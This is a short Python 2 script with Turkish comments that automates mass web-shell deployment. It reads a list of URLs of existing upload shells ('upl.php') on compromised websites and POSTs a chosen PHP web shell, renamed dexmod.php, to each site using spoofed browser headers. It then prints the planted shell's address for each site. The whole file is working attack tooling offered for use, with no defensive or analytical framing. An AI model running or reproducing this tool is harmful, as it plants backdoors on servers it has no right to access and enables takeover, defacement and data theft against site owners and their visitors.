#coding:utf-8
import requests
from requests_toolbelt import MultipartEncoder
print  """
##################################################
#              Cüneyt TANRISEVER                 #
#    Upl shell ile oto shell upload shell upload #
##################################################
"""
#sitelere upl.php (upload shell dosyalarınızı atınız o shell adreslerini proya verin istenilen sheli toplu olarak sitelere atsın)
sheller=open("sheller.txt","r").readlines()
for i in sheller:
    url=i.replace("\n","")
    yuklenecekshell="istenilen shell.php dosyanız "
    dosyaup = MultipartEncoder(fields={'file': ('dexmod.php', open(yuklenecekshell, 'rb')), '_upl':'Upload' })
    headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0 Cyberfox/52.9.1',
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language':'en-US,en;q=0.5',
    'Accept-Encoding':'gzip, deflate, br',
    'Connection':'keep-alive',
    'Upgrade-Insecure-Requests':'1',
    'Content-Length':'327',
    'Content-Type':dosyaup.content_type}

    acurl = requests.post(url, data=dosyaup ,headers=headers)
    #print acurl.content
    dex=url.split("/")
    duzelt= url.replace(str(dex[-1]),"dexmod.php")
    print duzelt







